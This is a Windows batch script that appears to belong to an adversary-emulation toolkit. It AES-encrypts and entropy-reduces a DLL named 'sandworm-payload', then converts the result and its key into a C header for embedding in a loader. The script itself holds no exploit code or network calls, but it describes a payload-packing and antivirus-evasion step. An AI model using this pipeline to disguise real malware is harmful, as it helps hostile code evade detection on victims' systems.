@echo off

echo.

set FilePayload="..\build\Win32\Release\sandworm-payload.dll"
set FileObfuscated=".\sandworm-payload.obfuscated"
set FileKey=".\sandworm-payload.key"
set FileInclude=".\xPayload.h"
set FileKeyString=".\xPayload.key"

set ExeObfuscation="..\..\bin2mess\build\Win32\Release\bin2mess.exe"
set ExeConversion="..\..\bin2c\build\Win32\Release\bin2c.exe"

echo Creating obfuscated payload
echo Payload file: %FilePayload%
echo Obfuscated file: %FileObfuscated%
echo Key file: %FileKey%
%ExeObfuscation% --aes --entropy-reduce %FilePayload% %FileObfuscated% %FileKey%

echo.

echo Creating payload include file
echo Include file: %FileInclude%
echo #pragma once > %FileInclude%
echo. >> %FileInclude%
echo. >> %FileInclude%
echo. >> %FileInclude%
echo #include ^<stdint.h^> >> %FileInclude%
echo. >> %FileInclude%
echo. >> %FileInclude%
echo. >> %FileInclude%

%ExeConversion% %FileObfuscated% s_payload 8 >> %FileInclude%

echo.

echo Creating key byte-string file
echo Key byte-string file: %FileKeyString%
%ExeConversion% %FileKey% > %FileKeyString%

pause